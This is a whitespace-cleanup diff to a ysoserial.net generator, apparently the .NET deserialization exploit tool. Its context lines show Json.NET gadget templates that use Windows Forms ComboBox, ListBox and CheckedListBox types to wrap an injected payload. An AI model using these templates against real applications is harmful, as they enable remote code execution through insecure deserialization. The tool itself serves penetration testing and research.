@@ -78,7 +78,7 @@ namespace ysoserial.Generators
             }
 
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
-            
+
             string payload = "";
 
             if (formatter.ToLower().Equals("json.net"))
@@ -100,7 +100,7 @@ namespace ysoserial.Generators
     '$type':'System.Windows.Forms.ComboBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
     'Items':[
         " + spvPayload + @"
-    ], 
+    ],
     'DisplayMember':'PropertyValue',
     'Text':'watever'
 }";
@@ -111,7 +111,7 @@ namespace ysoserial.Generators
     '$type':'System.Windows.Forms.ListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
     'Items':[
         " + spvPayload + @"
-    ], 
+    ],
     'DisplayMember':'PropertyValue',
     'Text':'watever'
 }";
@@ -122,7 +122,7 @@ namespace ysoserial.Generators
     '$type':'System.Windows.Forms.CheckedListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
     'Items':[
         " + spvPayload + @"
-    ], 
+    ],
     'DisplayMember':'PropertyValue',
     'Text':'watever'
 }";
